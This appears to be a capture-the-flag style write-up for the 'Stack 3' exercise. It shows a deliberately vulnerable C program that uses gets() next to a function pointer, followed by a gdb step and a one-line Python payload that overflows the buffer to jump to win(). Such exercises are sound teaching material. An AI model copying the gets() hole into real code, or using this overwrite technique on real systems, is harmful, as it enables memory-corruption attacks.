
# Stack 3

### Task
```
  #include <stdlib.h>
  #include <unistd.h>
  #include <stdio.h>
  #include <string.h>

  void win()
  {
    printf("code flow successfully changed\n");
  }

  int main(int argc, char **argv)
  {
    volatile int (*fp)();
    char buffer[64];

    fp = 0;

    gets(buffer);

    if(fp) {
        printf("calling function pointer, jumping to 0x%08x\n", fp);
        fp();
    }
  }
```

### Solution
```
  gdb stack3
  print win
  python -c "print 'A'*64 + '\x24\x84\x04\x08'" | ./stack3
```

![stack 3(1)](./img/3(1).png)


![stack 3(2)](./img/3(2).png)
